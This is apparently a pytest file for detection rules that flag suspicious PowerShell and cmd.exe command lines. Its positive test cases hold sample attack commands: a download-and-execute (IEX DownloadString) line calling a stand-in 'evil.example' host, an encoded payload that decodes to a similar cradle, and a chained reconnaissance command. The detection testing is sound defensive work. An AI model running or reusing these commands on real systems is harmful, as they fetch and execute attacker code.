from aire_detection.models import EventType
from aire_detection.rules import script as sc


def test_script001_positive_encoded(event_factory):
    rule = sc.EncodedPowerShellRule()
    # Realistic -enc payloads carry a UTF-16LE-encoded script body and are
    # typically much longer than a short string; use a long base64 blob.
    long_b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAnACkA"
    e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe",
                       command_line=f"powershell.exe -enc {long_b64}")
    m = rule.match(e)
    assert m is not None
    assert m.evidence["decoded_preview"] is not None


def test_script001_negative_no_encoding(event_factory):
    rule = sc.EncodedPowerShellRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe", command_line="powershell.exe -File a.ps1")
    assert rule.match(e) is None


def test_script002_positive_downloadstring(event_factory):
    rule = sc.PowerShellDownloadActivityRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe",
                       command_line="powershell.exe (New-Object Net.WebClient).DownloadString('http://x')")
    assert rule.match(e) is not None


def test_script002_negative(event_factory):
    rule = sc.PowerShellDownloadActivityRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe", command_line="powershell.exe Get-Process")
    assert rule.match(e) is None


def test_script003_positive_iex_web(event_factory):
    rule = sc.PowerShellWebRequestRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe",
                       command_line="powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://evil.example/a.ps1')")
    assert rule.match(e) is not None


def test_script003_negative_iex_local(event_factory):
    rule = sc.PowerShellWebRequestRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe",
                       command_line="powershell.exe IEX (Get-Content local.ps1)")
    assert rule.match(e) is None


def test_script004_positive_chained(event_factory):
    rule = sc.SuspiciousScriptHostExecutionRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="cmd.exe",
                       command_line="cmd.exe /c whoami && net user && ping 1.1.1.1 && del a.txt")
    assert rule.match(e) is not None


def test_script004_negative_single_command(event_factory):
    rule = sc.SuspiciousScriptHostExecutionRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="cmd.exe", command_line="cmd.exe /c dir")
    assert rule.match(e) is None


def test_script004_boundary_exactly_below_threshold(event_factory):
    rule = sc.SuspiciousScriptHostExecutionRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="cmd.exe", command_line="cmd.exe /c a && b")
    assert rule.match(e) is None  # only 1 separator, below threshold of 3


def test_script005_positive_base64_blob(event_factory):
    rule = sc.SuspiciousBase64CommandRule()
    blob = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Ng=="
    e = event_factory(EventType.PROCESS_CREATE, process_name="cmd.exe", command_line=f"cmd.exe /c echo {blob}")
    assert rule.match(e) is not None


def test_script005_negative_short_string(event_factory):
    rule = sc.SuspiciousBase64CommandRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="cmd.exe", command_line="cmd.exe /c echo hello")
    assert rule.match(e) is None


def test_script006_positive_obfuscation(event_factory):
    rule = sc.SuspiciousCommandObfuscationRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe",
                       command_line="powershell.exe " + "'p'+'ow'+'ershell'")
    assert rule.match(e) is not None


def test_script006_negative_plain(event_factory):
    rule = sc.SuspiciousCommandObfuscationRule()
    e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe", command_line="powershell.exe Get-Item .")
    assert rule.match(e) is None


def test_script_rules_malformed_event_no_command_line(event_factory):
    for rule in sc.get_rules():
        e = event_factory(EventType.PROCESS_CREATE, process_name="powershell.exe", command_line=None)
        assert rule.match(e) is None
